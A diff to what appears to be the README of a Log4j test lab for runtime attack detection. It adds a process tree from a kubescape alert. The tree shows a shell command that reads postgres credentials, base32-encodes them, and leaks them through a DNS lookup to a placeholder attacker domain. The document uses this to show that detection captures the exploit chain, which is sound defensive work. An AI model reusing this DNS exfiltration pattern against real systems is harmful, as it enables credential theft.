@@ -5,6 +5,28 @@ backend variants — the negative-control test for any active-diagnosis
 framework that claims to discriminate "vulnerable", "contained", and
 "patched" from the same kernel-observable trace.
 
+## Why this exists — the active-diagnosis claim, made literal
+
+After applying BoB-agent's pre-tuned SBOBs (`_artifacts/log4j-sbobs/`
+on `feat/chain-pipeline`) and firing the scenario-A attack, kubescape's
+R0001 alert payload contains the full exploit chain reconstructed
+from kernel-grounded process events:
+
+```
+java                                                       ← chain-backend's JVM
+└── sh -c "ROW=$(psql -h chain-postgres …); ENC=$(printf … base32 …); getent hosts \${ENC}.exfil.attacker.example.com"
+      ├── psql                                              ← stage 3 pivot
+      ├── base32 + tr                                       ← exfil encoder
+      └── getent OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ.exfil.attacker.example.com  ← stage 4 DNS exfil
+```
+
+The base32-encoded postgres credentials (`OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ`
+= base32 of `postgres:postgres`) are visible in the alert's `cmdline`
+field. The kernel-observable trace is not an abstraction of the attack
+— it IS the attack, byte-identical. That's what "active-diagnosis"
+means in practice. See R0001's `RuntimeProcessDetails.processTree`
+in the empirical session log on PR #131 for the literal alert payload.
+
 ## Scenarios
 
 | | backend image | log4j version | securityContext | expected verdict |
